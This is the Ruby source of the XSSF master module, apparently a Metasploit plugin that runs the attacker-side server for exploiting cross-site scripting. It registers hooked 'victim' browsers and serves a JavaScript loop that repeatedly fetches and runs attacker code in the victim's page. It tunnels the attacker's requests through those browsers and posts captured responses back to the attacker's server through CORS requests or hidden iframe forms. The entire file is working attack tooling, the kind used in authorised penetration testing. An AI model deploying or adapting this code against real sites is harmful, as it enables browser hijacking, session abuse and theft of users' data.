require 'cgi'
require 'rex/ui'
require 'uri'
require 'webrick'
require 'base64'

include WEBrick

#
# This module implements a HTTP Server used for the new XSSF plugin.
#
module Msf
	module Xssf
		module XssfMaster
			include Msf::Xssf::XssfDatabase
			include Msf::Xssf::XssfTunnel
			include Msf::Xssf::XssfGui
  
			#
			# Starts the server
			#
			def start(port, uri)	
				self.serverURI  = uri
				self.serverPort = port
				self.serverHost = Rex::Socket.source_address('1.2.3.4')
				
				self.server  = WEBrick::HTTPServer.new(
					:Port				=> port,
					:Logger				=> WEBrick::Log.new($stdout, WEBrick::Log::FATAL),
					:ServerSoftware 	=> "XSSF " + XSSF_VERSION,
					:ServerType 		=> Thread,
					:MaxClients     	=> 1000,
					:DoNotReverseLookup => true
				)

				self.server.mount(XSSF_RRC_FILES,  HTTPServlet::FileHandler, INCLUDED_FILES + XSSF_RRC_FILES)
				self.server.mount_proc("#{uri}") { |req, res| xssf_process_request(req, res) }	# Listening connections to URI
				self.server.start
  
				return false if not register_server(self.serverHost, port, uri)			
				
				# Check in background for active victims !
				Thread.new do; while (self.server) do;	update_active_victims;	Rex::ThreadSafe.sleep(2);	end; end
				

				# Starting GUI and Proxy server
				begin
					self.attacker_srv  = WEBrick::HTTPServer.new(
						:BindAddress 		=> XSSF_PUBLIC[0] ? '0.0.0.0' : '127.0.0.1',
						:Port				=> port.to_i + 1,
						:Logger				=> WEBrick::Log.new($stdout, WEBrick::Log::FATAL),
						:ServerSoftware 	=> "XSSF " + XSSF_VERSION,
						:ServerType 		=> Thread,
						:MaxClients     	=> 1000,
						:DoNotReverseLookup => true
					)

					self.attacker_srv.mount(XSSF_GUI_FILES,  HTTPServlet::FileHandler, INCLUDED_FILES + XSSF_GUI_FILES)
					self.attacker_srv.mount(XSSF_LOG_FILES,  HTTPServlet::FileHandler, INCLUDED_FILES + XSSF_LOG_FILES)
					self.attacker_srv.mount_proc("/") { |req, res| xssf_process_attacker_request(req, res) }

					self.attacker_srv.start
				rescue
					print_error("Error starting attacker' server : #{$!}.")			if (XSSF_MODE[0] =~ /^Debug$/i)
					print_error("XSSF Tunnel and GUI pages won't be available.\n")	if (XSSF_MODE[0] =~ /^Debug$/i)
				end
				
				return true
			end

			#
			# Stops the servers
			#
			def stop
				(self.server.unmount("#{self.serverURI}"); self.server.shutdown) if self.server;
				(self.attacker_srv.unmount("/"); self.attacker_srv.shutdown) if self.attacker_srv;
			end
			
			
			#
			# This method is triggered each time a request is done on GUI pages or XSSF Tunnel by attacker
			#
			def xssf_process_attacker_request(req, res)
				begin
					case req.path					
						# Victim log page is asked
						when /^#{self.serverURI + VICTIM_GUI}/
							build_log_page(req, res)
							
						else # Other page is asked by a victim : redirect to known file or active module (This part needs cookie to be activated) 
							if ((v = victim_tunneled) && (req.request_method =~ /^(GET|POST)$/i))
								xssf_tunnel_request(req, res, v)
							else
								XSSF_404(res)
						end
					end
				rescue
					XSSF_404(res) 
					print_error("Error 27: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
			end
			
			
			#
			# This method is triggered each time a request is done on the URI by a victim.
			#
			def xssf_process_request(req, res)
				begin
					req.query["#{PARAM_ID}"] ? id = (req.query["#{PARAM_ID}"]).to_i : ((req.cookies.to_s =~ /#{PARAM_ID}=(\d+)/) ? id = $1.to_i : id = nil)
						
					case req.request_method.upcase
						when 'GET';		process_get(req, res, id)			# Case of a GET request
						when 'POST';	process_post(req, res, id) 			# Case of a POST request
						else;			process_unknown(req, res, id)
					end
				rescue
					XSSF_404(res) 
					print_error("Error 0: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
				end
			end

			#
			# Manages GET requests
			#
			def process_get(req, res, id)
				interval = VICTIM_INTERVAL 	unless (interval = req.query["#{PARAM_INTERVAL}"])

				case req.path
					# Page asked is the victim loop page : Send loop page to the victim if correctly saved in the database
					when /^#{self.serverURI + VICTIM_LOOP}/
						if (id)
							get_victim(id) ? update_victim(id, "Unknown", interval.to_i) : (id = add_victim(req.peeraddr[3], interval.to_i, req.header['user-agent'][0].downcase))
						else
							id = add_victim(req.peeraddr[3], interval.to_i, req.header['user-agent'][0].downcase)
						end
						
						if (id)
							# If auto attacks are running for this new victim, then we add first one to the victim
							add_auto_attacks(id)
							print_good("New victim registered with id: #{id.to_s}") if (XSSF_MODE[0] =~ /^Verbose$/i)
							XSSF_RESP(res, loop_page(id, req.host) + xssf_post(id, req.host), 200, "OK", {	
																						'Content-Type' 					=> 'application/javascript', 
																						'P3P' 							=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"', 			# Don't know how P3P works (Compact Cookies Policy for IE / Safari), but it works !
																						'Set-Cookie' 					=> "id=#{id}; Path=/;"})
						else
							XSSF_404(res)
						end

					# Page asked is the victim ask page (victim is asking for new commands)
					when /^#{self.serverURI + VICTIM_ASK}/
						if (id)	# If an id is given, check if victim is in an attack process or not
							update_victim(id, req.query["#{PARAM_LOCATION}"], nil, ((req.cookies.size.to_i == 0) ? "NO" : "YES"))
								
							if (attack = get_first_attack(id))								# If an attack is waiting for current victim (attacks are done in priority, then tunnel)
								if (http_request_module(res, attack[0], req, id))
									puts ""; 			print_good("Code '#{attack[1]}' sent to victim '#{id}'") if not (XSSF_MODE[0] =~ /^Quiet$/i)
									attacked_victims; 	create_log(id, "Attack '#{attack[1]}' launched at url '#{attack[0]}'", nil) 
								end
							else
								if (victim = victim_tunneled)
									if (victim.id == id)
										code = ""
										
										TUNNEL_LOCKED.synchronize {
											TUNNEL.each do |key, value|
												if (value[0] != nil)
													code << %Q{ #{Base64.decode64(value[0])} } 
													TUNNEL[key][0] = nil
												end
											end
										}
										
										(code == "") ? XSSF_404(res) : XSSF_RESP(res, code, 200, "OK", {'Content-Type' 					=> 'application/javascript', 
																										'P3P' 							=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"', 
																										'Set-Cookie' 					=> "id=#{id}; Path=/;"})
									else
										XSSF_404(res)
									end
								else
									XSSF_404(res)
								end
							end
						else
							XSSF_404(res)
						end

					# Page asked is the XSSF test page (for test or ghost)
					when /^#{self.serverURI + VICTIM_TEST}/
						XSSF_RESP(res, test_page(req.host))
							
					else # Other page is asked by a victim : redirect to known file or active module (This part needs cookie to be activated) 
						process_unknown(req, res, id)
				end
			end

			#
			# Manage POST requests
			# Called when the victims responds to an attack (if attack send a response)
			#
			def process_post(req, res, id)
				response = "";	tunnel_headers = "";	mod_name = "Unknown";	tunnelid = nil;

				if req.query["#{PARAM_ID}"]
					response 		= req.query["#{PARAM_RESPONSE}"] 	if req.query["#{PARAM_RESPONSE}"] 
					tunnel_headers	= req.query["#{PARAM_HEADERS}"] 	if req.query["#{PARAM_HEADERS}"]
					mod_name		= req.query["#{PARAM_NAME}"] 		if req.query["#{PARAM_NAME}"]
					tunnelid		= req.query["#{PARAM_RESPID}"] 		if req.query["#{PARAM_RESPID}"]
				else		# Sometimes Cross-Requests aren't well understood by the Webrick server parser cause Content-Type isn't properly set by browser
					(req.body.split('&')).each do |p|
						response 		= $1 			if (p =~ /^#{PARAM_RESPONSE}=(.*)$/)
						tunnel_headers	= $1 			if (p =~ /^#{PARAM_HEADERS}=(.+)$/)
						mod_name		= $1 			if (p =~ /^#{PARAM_NAME}=(.+)$/)
						id				= Integer($1) 	if (p =~ /^#{PARAM_ID}=(.+)$/)
						tunnelid		= $1 			if (p =~ /^#{PARAM_RESPID}=(.+)$/)
					end
				end
				
				case req.path
					when /^#{self.serverURI + VICTIM_ANSWER}/
						(is_tunneled = (is_tunneled.id == id)) if (is_tunneled = victim_tunneled)
						
						if (is_tunneled)					# POST IN TUNNEL MODE
							tunnelid = URI.unescape(tunnelid)
							if(TUNNEL[tunnelid])
								TUNNEL_LOCKED.synchronize {
									TUNNEL[tunnelid][2] = Base64.encode64((URI.unescape(tunnel_headers)).strip)
									TUNNEL[tunnelid][1] = Base64.encode64(response)
			
									TUNNEL.delete(tunnelid) if ((TUNNEL[tunnelid][1].to_s).size > 10000000) 	# Deleting if more than 10Mo of data	
								}

								print_good("ADDING RESPONSE IN TUNNEL (#{tunnelid.to_s})") if not (XSSF_MODE[0] =~ /^Quiet$/i)
								XSSF_RESP(res)
							else
								XSSF_404(res)
							end
						else								# POST FROM A MODULE
							file_id = Rex::Text.rand_text_alphanumeric(rand(20) + 10)
							File.open(INCLUDED_FILES + XSSF_LOG_FILES + file_id.to_s + ".html", 'wb') {|f| f.write((response =~ /__________(.*)__________/) ? URI.unescape(Base64.decode64($1)) : URI.unescape(response)) }
							create_log(id, file_id.to_s + ".html", URI.unescape(mod_name).strip)
							print_good("Response received from victim '#{id.to_s}' from module '#{URI.unescape(mod_name).strip}'") if not (XSSF_MODE[0] =~ /^Quiet$/i)
							puts "#{(response =~ /__________(.*)__________/) ? URI.unescape(Base64.decode64($1)) : URI.unescape(response)}" if (XSSF_MODE[0] =~ /^Verbose$/i)
							XSSF_RESP(res)
						end
						
					when /^#{self.serverURI + VICTIM_SAFARI}/
						XSSF_RESP(res, "", 200, "OK", {	'Content-Type' 	=> 'text/html', 
														'P3P' 			=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"',
														'Set-Cookie' 	=> "id=#{id}; Path=/;"})
					
					else # Other page is asked by a victim: redirect to known file or active module (This part needs cookie to be activated) 
						process_unknown(req, res, id)
				end
			end

			#
			# Unknown page or method is asked by a victim => redirect to known active module (This part needs cookie to be activated)
			#
			def process_unknown(req, res, id)
				if (url = current_attack(id))	
					(data = run_http_client(url, req, true)) ? XSSF_RESP(res, add_xssf_post(data.body, id, req.host), data.code, data.message, data.headers) : XSSF_404(res)
				else
					XSSF_404(res)
				end
			end
			
		protected
			attr_accessor :server, :serverURI, :serverPort, :serverHost, :attacker_srv
			
			#
			# Sends XSSF 404 page
			#
			def XSSF_404(res)
				res['Access-Control-Allow-Origin']	= '*'
				res.status = 404
			end
			
			#
			# Sends XSSF HTML response
			#
			def XSSF_RESP(res, body = "", code = 200, message = "OK", headers = {})
				res['Content-Type'] 				= "text/html"			# Default, can be errased with headers
				res['Access-Control-Allow-Origin']	= '*'
				res['Cache-Control'] 				= 'post-check=0, pre-check=0, must-revalidate, no-store, no-cache'
				res['Pragma'] 						= 'no-cache'  
				res['Last-Modified'] 				= Time.now + 1000000000
				res['Expires'] 						= Time.now - 1000000000
				
				res.body = body;		res.status = code;		res.reason_phrase = message
				headers.each_pair { |k,v| res[k] = v }
				
				res['Content-Length'] 		= body.size
				res['Connection'] 			= 'close'
			end

			#
			# Acts like a client and server. 
			# Ask for a page to a module and forward the result to the client.
			# If module sends complete html page, creates an iframe on client side
			#
			def http_request_module(res, url, req, id)
				data = run_http_client(url, req, false)

				if (data != nil)
					data.headers['P3P'] 							= 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"'
					data.headers['Set-Cookie'] 						= "id=#{id}; Path=/;"
								
					case (data.code).to_s
						when /1..|4..|5../
							XSSF_404(res)
							
						when /3../
							if (data['Location'])
								src = "#{req.host}:#{self.serverPort}#{self.serverURI}#{data['Location']}".gsub(/\/\//, '/')
								
								code = %Q{
									iframe = XSSF_CREATE_IFRAME("REDIRECT_IFRAME", 50, 50);
									iframe.src = "http://#{src}";
									document.body.appendChild(iframe);
								}
						
								data['Content-Type'] = "text/javascript"
								XSSF_RESP(res, code, "200", "OK", data.headers)
								return true
							else
								XSSF_404(res)
							end
							
						else 	# 2xx
							if (data.body =~ /^(.*<html[^>]*>)(.*)(<\/html>.*)$/im)	
								src = "#{req.host}:#{self.serverPort}#{self.serverURI}#{URI.parse(URI.escape(url)).path.to_s}".gsub(/\/\//, '/')
								
								# Can't create IFRAME dynamically because we need the src to be the attack server ! Victim need to ask again
								code = %Q{
									iframe = XSSF_CREATE_IFRAME("MODULE_IFRAME", 50, 50);
									iframe.src = "http://#{src}";
									document.body.appendChild(iframe);
								}

								data['Content-Type'] = "text/javascript"
								XSSF_RESP(res, code, data.code, data.message, data.headers)
								return true
							else
								XSSF_RESP(res, add_xssf_post(data.body, id, req.host), data.code, data.message, data.headers)
								return true
							end
					end
				else
					XSSF_404(res)
				end
				
				return false
			end
			
			#
			# Adds XSSF_POST function to html pages in iframes
			#
			def add_xssf_post(data, id, host)
				if (data =~ /^(.*<head[^>]*>.*)(<\/head>.*)$/im)
					data = $1 + %Q{ <script type='text/javascript'>  		} + xssf_post(id, host) + %Q{ </script> } + $2
				elsif (data =~ /^(.*<html[^>]*>)(.*<\/html>.*)$/im)
					data = $1 + %Q{ <head> <script type='text/javascript'>  } + xssf_post(id, host) + %Q{ </script> </head>} + $2
				end
				return data
			end
			
			#
			# Runs an HTTP client on a given url
			#
			def run_http_client(url, req, process_params)
				begin
					parsed_url 	= URI.parse(URI.escape(CGI::unescape(url)))
					client 		= Rex::Proto::Http::Client.new(parsed_url.host, parsed_url.port, {}, false)
					
					(req.unparsed_uri =~ /^#{parsed_url.path}/) ? uri = req.unparsed_uri : uri = parsed_url.path + req.unparsed_uri
					
					resp = client.send_recv(client.request_raw(
												'method'=> req.request_method, 
												'vhost'	=> parsed_url.host + ':' + parsed_url.port.to_s,
												'agent' => req.header['user-agent'][0],
												'cookie'=> req.cookies[0],
												'uri'	=> process_params ? Rex::Text.to_hex_ascii(uri).gsub(/\\x/, '%') : parsed_url.path,
												'data'  => process_params ? req.body : ""
											))
					client.close
					return resp
				rescue
					print_error("Error 1: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					return nil
				end
			end
			
			#
			# Returns test page
			#
			def test_page(host)
				return %Q{ 	<html><body>
								<h2> TEST PAGE WITH XSS </h2><br/>
								<pre> INJECTED : &lt;script type=&quot;text/javascript&quot; src=&quot;http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&quot;&gt;&lt;/script&gt;</pre>
								<script type="text/javascript">
									s = document.createElement('script');
									s.src = "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&time=" + escape(new Date().getTime());
									document.body.appendChild(s);
								</script>

								<a href="http://www.google.fr">Go GoOgLe</a>
							</body></html>
				}
			end

			#
			# Returns loop page
			#
			def loop_page(id, host)
				loop = %Q{
					function XSSF_EXECUTE_LOOP() {
						try { if (document.getElementById('XSSF_CODE') != null) document.body.removeChild(document.getElementById('XSSF_CODE')); } catch(e) {}
						script = document.createElement('script');	script.id = "XSSF_CODE";
						script.src = "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_ASK}?#{PARAM_LOCATION}=" + window.location.protocol + "//" + window.location.host + "&#{PARAM_ID}=#{id}&time=" + escape(new Date().getTime());
						document.body.appendChild(script);
					}
	
					if (typeof(XSSF_LOOP) != "undefined")	clearInterval(XSSF_LOOP);
					XSSF_LOOP = setInterval(XSSF_EXECUTE_LOOP, #{(victim = get_victim(id)) ? victim.interval : VICTIM_INTERVAL} * 1000);	// Interrupt with clearInterval(XSSF_LOOP);
				}

				return loop
			end
			
			#
			# Returns XSSF provided functions, including XSSF_POST
			#
			# XSSF POST METHODS EXPLANATION :
			#    * OPTION 1: using <image src="http://XSSF_SERVER/data=xxxxx" />. 
			#		+ Supported by all browsers
			#		- Limited by URI size (2083 bytes in IE). 
			#		- Long URI size (>= 1Mo) end with a Webrick crash.
			#    * OPTION 2: using a <FORM> element within invisible <IFRAME> posting to XSSF_SERVER. 
			#		+ Supported by all browsers
			#		+ No size limitation inside browser
			#		- Secured domain (HTTPS) will prompt user that secure data is sent over unsecure method
			#     * OPTION 3: using the new Cross-Origin Resource Sharing property with XMLHttpRequest or XDomainRequest elements.
			#       + No size limitation inside browser
			#       + Works without alerting user on HTTPs domains
			#		- Only supported by browser implementing HTML5 Cross-Origin Resource Sharing specification (IE 8+, FF 3.5+, Safari 4+, Chrome, Android Browser 2.1+, IOS Safari 3.2+)
			#
			# -------------------------------------------------------------------------
			# |   HTTP TARGETED DOMAIN   ||           HTTPS TARGETED DOMAIN           |
			# -------------------------------------------------------------------------
			# |                          ||   CORS SUPPORTED    || CORS NOT SUPORTED  |
			# |                          ||-------------------------------------------|
			# |         OPTION 2         ||                     ||     OPTION 2       |
			# |                          ||      OPTION 3       ||   User will be     |
			# |                          ||                     ||     prompted?      |
			# -------------------------------------------------------------------------
			#
			def xssf_post(id, host)
				id = -1 if not id

				info = browser_info(id)

				code = %Q{
					function XSSF_CREATE_XHR() {
						if (window.XMLHttpRequest) return new XMLHttpRequest();
						if (window.XDomainRequest) return new XDomainRequest(); 

						if (window.ActiveXObject) {
							var names = ["Msxml2.XMLHTTP.6.0", "Msxml2.XMLHTTP.3.0", "Msxml2.XMLHTTP", "Microsoft.XMLHTTP"];
							for(var i in names) {
								try{ return new ActiveXObject(names[i]); }
								catch(e){}
							}
						}
					}

					function XSSF_GARBAGE() {
						var iframes = document.getElementsByTagName('iframe');

						for(var i = 0; i < iframes.length; i++)
							if(iframes.item(i).getAttribute('name') == 'POST_IFRAME')
								document.body.removeChild(iframes.item(i));
					}
					XSSF_DO_GARBAGE = setInterval(XSSF_GARBAGE, #{TUNNEL_TIMEOUT} * 1000);
				}

				if (info[0] =~ /Internet Explorer/i)	# IE Binary data transform
					code << %Q{
						d = document.createElement('div');	d.id = "vbDiv";	document.body.appendChild(d);
						document.getElementById('vbDiv').innerHTML = 	unescape('%3Cscript type="text/vbscript"%3E') + ' Function XSSF_BIN_TO_ARRAY(data): \
																		ReDim byteArray(LenB(data)): For i = 1 To LenB(data): byteArray(i-1) = AscB(MidB(data, i, 1)): Next: \
																		XSSF_BIN_TO_ARRAY=byteArray: End Function' + unescape('%3C%2Fscript%3E');
																		
						function XSSF_PROCESS_BINARY(xmlhttp) {
							data = XSSF_BIN_TO_ARRAY((xmlhttp.responseBody).toArray());
							r = "";	size = data.length - 1;
							for(var i = 0; i < size; i++)	r += String.fromCharCode(data[i]);
							return r;
						}
					}
				else
					code << %Q{
						function XSSF_PROCESS_BINARY(xmlhttp) {
							data = xmlhttp.responseText;	r = "";		size = data.length;
							for(var i = 0; i < size; i++)	r += String.fromCharCode(data.charCodeAt(i) & 0xff);
							return r;
						}
					}
				end

				code << %Q{											
					function XSSF_POST_BINARY_AJAX_RESPONSE(x, method, url, mod_name, data, resp_id) {
						mod_name = mod_name || null;	data = data || null;	resp_id	= resp_id || Math.floor(Math.random()*10000000);
						if ((method != "GET") && (method != "POST")) return;

						x.open(method, url, true);

						x.setRequestHeader('Cache-Control', "no-cache");		x.setRequestHeader('Accept-Charset', "x-user-defined");					
						if (x.overrideMimeType) 								x.overrideMimeType('text/plain; charset=x-user-defined');

						if (method == "POST"){
							x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
							x.setRequestHeader("Content-length", data.length);		
							x.setRequestHeader("Connection", "close");
						}	
						x.send(unescape(data));

						x.onreadystatechange=function() {
							if (x.readyState == 4) 
								XSSF_POST(XSSF_PROCESS_BINARY(x), mod_name, x.getAllResponseHeaders() + "\\n===" + x.status + "===\\n==" + x.statusText + "==", resp_id);
						}
					}

					function XSSF_CREATE_IFRAME(id, width, height) {		// Creates an Iframe
						if (document.getElementById(id) != null) document.body.removeChild(document.getElementById(id));
						
						i = document.createElement('iframe');	i.id = id;
						i.width = "0" + width + "%";			i.height = "0" + height + "%";
						i.style.border = "0px";					i.frameborder = "0";
						i.scrolling = "auto";					i.style.backgroundColor = "transparent";
						
						return i;
					}
					
					function XSSF_POST_B64(response, mod_name) {
						XSSF_POST("__________" + response + "__________", mod_name);
					}
				}
				
				# If Cross-Domain request (Cross-Origin Resource Sharing) can be used, then we use it in order to POST results
				if 	( 	((info[0] =~ /Internet Explorer/i) and (info[1] >= 8.0)) or
						((info[0] =~ /Firefox/i) and (info[1] >= 3.5))
					)
					code << %Q{
						function XSSF_POST(response, mod_name, headers, resp_id) {
							x = XSSF_CREATE_XHR();
							headers = headers || "";		mod_name = mod_name || "Unknown";		resp_id	= resp_id || Math.floor(Math.random()*10000000);
								
							x.open("POST", "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_ANSWER}");
							x.send("#{PARAM_NAME}=" + escape(mod_name) + "&#{PARAM_RESPONSE}=" + escape(response) + "&#{PARAM_HEADERS}=" + escape(headers) + "&#{PARAM_RESPID}=" + escape(resp_id) + "&#{PARAM_ID}=#{id}");
						}
					}
				else
					code << %Q{
						function XSSF_POST(response, mod_name, headers, resp_id) {
							headers = headers || "";		mod_name = mod_name || "Unknown";		resp_id	= resp_id || Math.floor(Math.random()*10000000);
							
							i = XSSF_CREATE_IFRAME(resp_id, 0, 0);	i.name = "POST_IFRAME";		document.body.appendChild(i);

							clearInterval(XSSF_DO_GARBAGE);		XSSF_DO_GARBAGE = setInterval(XSSF_GARBAGE, #{TUNNEL_TIMEOUT} * 1000);
							
							var d = null;
							if(i.contentDocument)		d = i.contentDocument;
							else if(i.contentWindow)   	d = i.contentWindow.document;
							else if(i.document)			d = i.document;
							else						return;

							string  = "<form name='XSSF_FORM' id='XSSF_FORM' method='POST' enctype='multipart/form-data' action='http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_ANSWER}' >";
							string += "<input name='#{PARAM_NAME}' 		value='"+escape(mod_name)+"'	type='hidden'>";
							string += "<input name='#{PARAM_RESPONSE}' 	value='"+escape(response)+"'	type='hidden'>"; 
							string += "<input name='#{PARAM_HEADERS}' 	value='"+escape(headers)+"' 	type='hidden'>";
							string += "<input name='#{PARAM_RESPID}' 	value='"+escape(resp_id)+"' 	type='hidden'>"; 
							string += "<input name='#{PARAM_ID}' 		value='#{id}'					type='hidden'></form>";
							
							d.open(); d.write(string); d.close(); d.forms[0].submit();
						}
					}
				end
				
				# Safari browser need a POST request inside iframe to set cross-domain cookie
				if ((info[0] =~ /SAFARI/i) and (not info[2] =~ /ANDROID/i)) 
					code << %Q{	
						i = XSSF_CREATE_IFRAME("SAFARI_COOKIE", 0, 0);	i.name = "POST_IFRAME";		document.body.appendChild(i);
							
						var d = null;
						if(i.contentDocument)		d = i.contentDocument;
						else if(i.contentWindow)   	d = i.contentWindow.document;
						else if(i.document)			d = i.document;
						else						d = null;

						string  = "<form name='XSSF_FORM' id='XSSF_FORM' method='POST' enctype='multipart/form-data' action='http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_SAFARI}'>";
						string += "<input name='#{PARAM_ID}' 	value='#{id}'	type='hidden'></form>";

						if (d != null) { d.open(); d.write(string); d.close(); d.forms[0].submit(); }
					}
				end
				
				code << %Q{
					XSSF_SERVER = "http://#{host}:#{self.serverPort}#{self.serverURI}";
					XSSF_VICTIM_ID 	= #{id.to_s};
					XSSF_XHR 		= XSSF_CREATE_XHR();
				}

				return code
			end
		end
	end
end

